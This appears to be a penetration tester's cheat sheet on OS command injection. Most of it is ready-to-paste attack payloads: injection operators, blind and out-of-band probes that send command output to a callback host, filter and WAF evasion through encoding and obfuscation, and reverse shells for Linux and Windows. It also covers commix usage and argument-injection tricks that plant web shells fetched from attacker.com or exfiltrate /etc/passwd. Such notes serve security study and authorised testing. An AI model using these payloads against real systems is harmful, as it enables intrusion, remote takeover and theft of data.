# Command Injection

#CommandInjection #WebAttacks #RCE #Evasion #Fuzzing

## What is this?

User-controlled input is passed unsanitized to a system shell call. The injected operator appends or chains commands to the intended one. Vulnerable functions by language:

| Language | Dangerous Functions |
|---|---|
| PHP | `exec`, `system`, `shell_exec`, `passthru`, `popen` |
| Node.js | `child_process.exec`, `child_process.spawn` |
| Python | `os.system`, `subprocess.call/run/Popen` |
| C# / .NET | `Process.Start`, `ProcessStartInfo` |

---

## Tools

| Tool | Purpose |
|---|---|
| `commix` | Automated command injection detection and exploitation |
| `Bashfuscator` | Linux bash obfuscation framework |
| `Invoke-DOSfuscation` | Windows CMD obfuscation generator |
| `Burp Suite` | Intercept and fuzz injection points |
| `ffuf` | Fuzz operators and payloads |

---

## Injection Operators

| Operator | Character | URL-Encoded | Behavior |
|---|---|---|---|
| Semicolon | `;` | `%3b` | Both commands execute |
| New Line | `\n` | `%0a` | Both commands execute |
| Background | `&` | `%26` | Both execute (second output shown first) |
| Pipe | `\|` | `%7c` | Both execute (only second output shown) |
| AND | `&&` | `%26%26` | Both only if first succeeds |
| OR | `\|\|` | `%7c%7c` | Second only if first fails |
| Sub-Shell | ` `` ` | `%60%60` | Both — Linux only |
| Sub-Shell | `$()` | `%24%28%29` | Both — Linux only |

---

## Detection

### Verbose (output returned)

Inject a command after the target parameter — if output appears in the response, injection is confirmed:

```
# Test payloads (try different operators — one may be filtered)
127.0.0.1; whoami
127.0.0.1 && whoami
127.0.0.1 | whoami
127.0.0.1 || whoami
127.0.0.1`whoami`
127.0.0.1$(whoami)
```

### Blind — time-based

No output returned. Inject a delay and measure response time:

```bash
# Linux
127.0.0.1; sleep 5
127.0.0.1 && sleep 5
127.0.0.1 | sleep 5

# Windows
127.0.0.1& timeout /t 5
127.0.0.1& ping -n 5 127.0.0.1
```

> [!note] If the response takes ~5 seconds longer → blind CI confirmed

### Blind — OOB (out-of-band)

Trigger a DNS or HTTP callback to a controlled server. Use Burp Collaborator or interactsh:

```bash
# Linux — DNS
127.0.0.1; nslookup <collaborator-url>
127.0.0.1; curl http://<collaborator-url>/

# Linux — HTTP with data exfil
127.0.0.1; curl http://<collaborator-url>/$(whoami)
127.0.0.1; wget -q -O- http://<collaborator-url>/$(id | base64)

# Windows — DNS
127.0.0.1& nslookup <collaborator-url>
127.0.0.1& powershell -c "Invoke-WebRequest http://<collaborator-url>/"
```

---

## Filter / WAF Bypass

Filters may block specific operators, keywords (`cat`, `whoami`, `ls`), or characters (spaces, slashes). Test one character at a time to identify what's blocked.

### Whitespace Substitution (Linux)

| Trick | Result |
|---|---|
| `%09` | Tab — accepted where space is blocked |
| `${IFS}` | Expands to space/tab — cannot use inside `$()` |
| `{ls,-la}` | Brace expansion — comma becomes space |

```bash
# Examples
cat${IFS}/etc/passwd
{cat,/etc/passwd}
cat%09/etc/passwd
ls${IFS}-la${IFS}/
```

### Whitespace Substitution (Windows)

| Trick | Result |
|---|---|
| `%09` | Tab |
| `%PROGRAMFILES:~10,-5%` | Space (CMD) |
| `$env:PROGRAMFILES[10]` | Space (PowerShell) |

### Character Tricks (Linux)

| Payload | Returns |
|---|---|
| `${PATH:0:1}` | `/` |
| `${LS_COLORS:10:1}` | `;` |
| `$(tr '!-}' '"-~'<<<[)` | `\` (char shift) |
| `$(tr '!-}' '"-~'<<<:)` | `;` (char shift) |
| `printenv` | List all env vars — find useful chars |

```bash
# Example using env var chars to avoid slash and semicolon
127.0.0.1${LS_COLORS:10:1}${IFS}whoami
```

### Character Tricks (Windows)

| Payload | Returns |
|---|---|
| `%HOMEPATH:~0,-17%` | `\` (CMD) |
| `%HOMEPATH:~6,-11%` | `\` (CMD) |
| `$env:HOMEPATH[0]` | `\` (PowerShell) |
| `Get-ChildItem Env:` | All env vars |

---

## Command Obfuscation

### Linux

**Quote/backslash insertion** — breaks keyword without changing execution:

```bash
w'h'o'am'i       # → whoami
w"h"o"am"i       # → whoami
who$@ami          # → whoami
w\ho\am\i         # → whoami
```

**Case manipulation** (Linux is case-sensitive — use tr or printf):

```bash
$(tr "[A-Z]" "[a-z]"<<<"WhOaMi")          # → whoami
$(a="WhOaMi";printf %s "${a,,}")           # → whoami
```

**Reversed commands**:

```bash
echo 'whoami' | rev                        # → imaohw
$(rev<<<'imaohw')                          # executes whoami
```

**Base64 encoding** — avoids keyword filters entirely:

```bash
# Encode
echo -n 'cat /etc/passwd' | base64         # → Y2F0IC9ldGMvcGFzc3dk

# Decode and execute
bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dk)

# With quote obfuscation on the decoder
b'a's'h'<<<$('b'a's'e'6'4' -d<<<Y2F0IC9ldGMvcGFzc3dk)
```

**Hex decoding**:

```bash
echo -n 'whoami' | xxd -p                  # → 77686f616d69
$(printf '\x77\x68\x6f\x61\x6d\x69')      # executes whoami
```

**Subshell nesting** — useful when semicolons are filtered:

```bash
# Commands chain through subshells — innermost runs first
$($(whoami))
```

### Windows

**Caret insertion** (CMD only — caret is a continuation char):

```cmd
who^ami    → whoami
```

**Case** (Windows CMD is case-insensitive — no trick needed):

```cmd
WhOaMi     → whoami
```

**Reversed commands** (PowerShell):

```powershell
"whoami"[-1..-20] -join ''                            # → imaohw
iex "$('imaohw'[-1..-20] -join '')"                  # executes whoami
```

**Base64 encoding** (PowerShell — must be UTF-16LE):

```powershell
# Encode
[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami'))
# → dwBoAG8AYQBtAGkA

# Decode and execute
iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))"

# Or via powershell -EncodedCommand
powershell -EncodedCommand dwBoAG8AYQBtAGkA
```

---

## Escalation — Get a Shell

Once injection is confirmed, upgrade to a full reverse shell. Set up listener first:

```bash
nc -lvnp 4444
```

### Linux reverse shells

```bash
# bash
bash -i >& /dev/tcp/10.10.14.5/4444 0>&1

# URL-encoded version (for injection in URL params)
bash%20-i%20>%26%20/dev/tcp/10.10.14.5/4444%200>%261

# via /dev/tcp without bash -i
0<&196;exec 196<>/dev/tcp/10.10.14.5/4444; sh <&196 >&196 2>&196

# python
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("10.10.14.5",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# nc (if -e available)
nc -e /bin/sh 10.10.14.5 4444

# nc (without -e)
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.5 4444 >/tmp/f
```

### Windows reverse shells

```powershell
# PowerShell one-liner
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.5',4444);$s = $client.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){$d = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $d 2>&1 | Out-String );$sb2 = $sb + 'PS ' + (pwd).Path + '> ';$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$client.Close()"

# cmd through nc
nc.exe -e cmd.exe 10.10.14.5 4444
```

---

## Automated Testing — commix

```bash
# Basic scan
commix --url "http://target.com/ping.php?ip=INJECT_HERE"

# POST request
commix --url "http://target.com/ping.php" --data "ip=INJECT_HERE"

# With cookie
commix --url "http://target.com/ping.php?ip=INJECT_HERE" --cookie "PHPSESSID=abc123"

# From Burp request file
commix -r request.txt

# Force technique
commix --url "http://target.com/ping.php?ip=INJECT_HERE" --technique=time    # time-based
commix --url "http://target.com/ping.php?ip=INJECT_HERE" --technique=file    # file-based OOB

# OS shell
commix --url "http://target.com/ping.php?ip=INJECT_HERE" --os-shell
```

---

## Obfuscation Tools

```bash
# Bashfuscator (Linux)
git clone https://github.com/Bashfuscator/Bashfuscator
cd Bashfuscator && pip3 install -e .

bashfuscator -c 'cat /etc/passwd'                    # random technique
bashfuscator -c 'cat /etc/passwd' -s 1 -t 1 --no-mangling -m random   # minimal

# Invoke-DOSfuscation (Windows PowerShell)
Import-Module .\Invoke-DOSfuscation.psd1
Invoke-DOSfuscation
SET COMMAND whoami
encoding
1      # select encoding type
```

---

## Filter Detection Methodology

Map the filter systematically before burning time on complex bypasses.

```
1. Test each operator solo — which ones trigger a block vs pass through?
   ; | & && || \n $() ``

2. Test a benign command with a passing operator — does output appear?
   ; id    ; uname    ; echo test

3. Test whitespace — is space blocked?
   ;${IFS}id    ;%09id    ;{id}

4. Test slashes — is / blocked?
   ;cat${IFS}${PATH:0:1}etc${PATH:0:1}passwd

5. Test command keywords — which are blocked?
   id → not blocked?  whoami → blocked?  uname → blocked?

6. Narrow down: if keyword is blocked, try alternatives (see table below)
   or use obfuscation (quotes, base64, reversal)
```

> [!note] One character at a time. A WAF may silently drop the whole request or return a generic error — use time-based confirmation if output disappears.

---

## Blacklisted Command Alternatives

When a command keyword is filtered, substitute with an equivalent:

### File read

| Blocked | Alternatives |
|---|---|
| `cat` | `tac` `more` `less` `head` `tail` `nl` `od` `xxd` `strings` |
| `cat /etc/passwd` | `while read l; do echo $l; done < /etc/passwd` |
| `cat` | `grep '' /etc/passwd` (grep with empty pattern prints all) |

```bash
tac /etc/passwd
head -n 50 /etc/passwd
nl /etc/passwd
od -c /etc/passwd
xxd /etc/passwd
strings /etc/passwd
grep${IFS}''${IFS}/etc/passwd
```

### Directory listing

| Blocked | Alternatives |
|---|---|
| `ls` | `find . -maxdepth 1` `dir` (Windows) `echo *` `printf '%s\n' *` |

```bash
find . -maxdepth 1
echo *
printf '%s\n' /var/www/html/*
```

### User / system info

| Blocked | Alternatives |
|---|---|
| `whoami` | `id` `id -un` `echo $USER` `echo $USERNAME` |
| `hostname` | `uname -n` `cat /etc/hostname` |
| `uname` | `cat /proc/version` `cat /etc/os-release` |
| `ifconfig` | `ip a` `ip addr` `cat /proc/net/if_inet6` |
| `netstat` | `ss -tlnp` `cat /proc/net/tcp` |
| `ps` | `ls /proc/*/exe` `cat /proc/*/cmdline` |

### Network / data exfil

| Blocked | Alternatives |
|---|---|
| `curl` | `wget` `fetch` `lynx` `python3 -c "import urllib..."` |
| `wget` | `curl` `nc` `bash /dev/tcp/...` |
| `nc` | `bash -i >& /dev/tcp/...` `socat` `python3 socket` |

### Windows alternatives (CMD / PowerShell)

| Blocked | Alternatives |
|---|---|
| `type` | `more` `Get-Content` `gc` |
| `dir` | `ls` (PS) `Get-ChildItem` `gci` |
| `whoami` | `echo %USERNAME%` `$env:USERNAME` |
| `ipconfig` | `Get-NetIPAddress` |
| `net user` | `Get-LocalUser` |

---

## Argument Injection

A distinct case: the injection point is **inside the arguments** of a command, not after it. You can't append a new command, but you can inject flags that change what the existing command does.

Common when the app builds a command like:
```
curl <user-input>
wget <user-input>
ffmpeg -i <user-input>
convert <user-input> output.jpg
rsync <user-input> /backup/
```

### curl argument injection

```bash
# Inject --output to write a file (web shell)
http://attacker.com/shell.php --output /var/www/html/shell.php

# Read internal files via file://
file:///etc/passwd

# SSRF via redirected fetch
http://169.254.169.254/latest/meta-data/ -o /tmp/meta

# Inject -x to use a proxy (exfil data)
http://target.com/ -x http://attacker.com:8080/
```

### wget argument injection

```bash
# Write file to web root
http://attacker.com/shell.php -O /var/www/html/shell.php

# --post-file to exfil a local file
http://attacker.com/ --post-file=/etc/passwd
```

### ImageMagick / convert argument injection

```bash
# Read arbitrary file and send to attacker (SSRF)
http://attacker.com/img.jpg -write /var/www/html/shell.php

# Or via label: scheme (reads file content as text)
label:@/etc/passwd output.png
```

### ffmpeg argument injection

```bash
# Read local file via concat: protocol
concat:/etc/passwd

# SSRF — fetch internal resource and encode in output
http://169.254.169.254/latest/meta-data/
```

### rsync argument injection

```bash
# -e flag to inject shell command as the remote shell
-e 'sh -c "id>/tmp/pwned"'
```

> [!note] Argument injection often bypasses command injection filters because no operator characters are needed — the injected content looks like a URL or flag.

---

## Injection Operator Cheatsheet (Copy-Paste)

```
;
%3b
\n
%0a
&
%26
|
%7c
&&
%26%26
||
%7c%7c
``
%60%60
$()
%24%28%29
```

---

## Quick Reference

| Goal | Payload |
|---|---|
| Test verbose | `; whoami` `&& id` `\| id` |
| Test blind (time) | `; sleep 5` `& timeout /t 5` |
| Test blind (OOB) | `; curl http://<collab>/$(whoami)` |
| Space bypass (Linux) | `${IFS}` `%09` `{cmd,-arg}` |
| Slash bypass (Linux) | `${PATH:0:1}` |
| Quote bypass (Linux) | `w'ho'ami` `w\ho\am\i` |
| Case bypass (Linux) | `$(tr "[A-Z]" "[a-z]"<<<"WhOaMi")` |
| Reverse cmd (Linux) | `$(rev<<<'imaohw')` |
| Base64 exec (Linux) | `bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dk)` |
| `cat` alternatives | `tac` `more` `head` `nl` `grep '' /file` |
| `ls` alternatives | `find . -maxdepth 1` `echo *` |
| `whoami` alternatives | `id` `id -un` `echo $USER` |
| Caret bypass (Windows CMD) | `who^ami` |
| Base64 exec (Windows PS) | `powershell -EncodedCommand <b64>` |
| Argument injection | `curl <input> --output /webroot/shell.php` |
| Automate | `commix --url "..." --os-shell` |
| Linux obfuscate | `bashfuscator -c 'cmd'` |
| Windows obfuscate | `Invoke-DOSfuscation` |
